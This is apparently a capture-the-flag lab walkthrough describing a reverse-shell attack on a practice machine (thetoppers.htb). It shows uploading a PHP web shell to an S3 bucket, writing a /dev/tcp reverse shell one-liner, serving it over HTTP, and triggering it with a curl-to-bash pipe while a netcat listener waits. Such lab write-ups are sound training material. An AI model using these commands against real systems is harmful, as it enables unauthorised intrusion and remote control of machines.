
## EXAMPLE OF A REVERSE SHELL PROCESS

1. Investigate accessible subdomains using gobuster.
2. Check if there are any files in the subdomain's bucket (e.g., index.php).
3. Create a script (e.g., in PHP if an index.php is found) to execute commands on the page's endpoint.
````bash
<?php system($_GET["cmd"]); ?>
````
4. Add the script that allows us to send commands through the endpoint:
````bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
````
5. Use `ifconfig` to determine our IP address and create the reverse shell command using https://www.revshells.com:
````bash
echo 'sh -i >& /dev/tcp/10.10.15.142/443 0>&1' > shell.sh
```` 
6. Open a server on our machine to connect to the reverse shell:
````bash
python3 -m http.server 8080
```` 
7. Use `netcat` to gain access to the reverse shell:
````bash
sudo nc -lvnp 443
````
8. Curl the file containing the reverse shell script on our machine using the exposed IP (in this case, tun0) and port. Create a pipe so that when the curl is performed, it enters bash. (Note: `%20` represents a space character.)
````bash
http://thetoppers.htb/shell.php?cmd=curl%2010.10.15.142:8080/shell.sh|bash
````
9. Once executed, access to the target machine should be achieved at the location where `netcat` was running.
